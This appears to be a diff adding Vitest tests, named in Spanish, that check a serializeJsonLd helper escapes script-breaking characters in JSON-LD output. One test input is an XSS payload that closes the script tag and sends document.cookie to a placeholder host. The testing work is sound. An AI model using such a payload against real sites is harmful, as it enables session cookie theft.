@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { buildSafeFileUrl, isSafeUrl } from "@/lib/security";
+import { buildSafeFileUrl, isSafeUrl, serializeJsonLd } from "@/lib/security";
 
 describe("buildSafeFileUrl", () => {
   it("permite rutas de adjuntos que contienen 'on' (regresión)", () => {
@@ -32,5 +32,29 @@ describe("isSafeUrl", () => {
   it("rechaza otros protocolos", () => {
     expect(isSafeUrl("ftp://example.com")).toBe(false);
     expect(isSafeUrl("data:text/html,hi")).toBe(false);
+  });
+});
+
+describe("serializeJsonLd", () => {
+  it("un título con </script><script> no puede cerrar el bloque JSON-LD", () => {
+    const titulo = "</script><script>fetch('//x/'+document.cookie)</script>";
+    const out = serializeJsonLd({ headline: titulo, keywords: "a & b <!--" });
+    expect(out).not.toMatch(/<\/script/i);
+    expect(out).not.toContain("<");
+    expect(out).not.toContain(">");
+    expect(out).not.toContain("&");
+    expect(out).toContain("\\u003c/script\\u003e");
+  });
+
+  it("sigue siendo JSON válido con el mismo valor (sin doble escape de comillas)", () => {
+    const data = {
+      headline: 'Dijo "hola" </script> \ fin',
+      sep: "a\u2028b\u2029c",
+      lista: ["<b>", 1, null],
+    };
+    const out = serializeJsonLd(data);
+    expect(out).not.toContain("\u2028");
+    expect(out).not.toContain("\u2029");
+    expect(JSON.parse(out)).toEqual(data);
   });
 });
